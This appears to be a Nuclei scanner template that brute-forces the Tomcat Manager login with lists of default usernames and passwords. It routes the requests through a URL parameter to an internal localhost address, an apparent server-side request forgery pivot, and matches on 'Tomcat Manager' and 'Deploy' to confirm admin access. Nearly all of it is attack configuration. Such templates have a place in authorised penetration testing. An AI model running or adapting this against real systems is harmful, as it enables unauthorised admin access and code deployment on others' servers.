id: tomcat-bruteforce-deploy

info:
  name: Tomcat Manager Bruteforce
  author: Jake Lo.ai
  severity: critical

http:
  - method: GET
    path:
      - "{{BaseURL}}/?url=http://127.0.0.1:8888/manager/html"

    # Use Nuclei's built-in basic auth fuzzer
    payloads:
      username: [tomcat, admin, manager, root]
      password: [tomcat, admin, manager, password, changeme]

    fuzzing:
      - part: header
        type: replace
        mode: multiple
        keys:
          - Authorization
        fuzz:
          - "Basic {{base64(username + ':' + password)}}"

    matchers:
      - type: word
        part: body
        words:
          - "Tomcat Manager"
          - "Deploy"
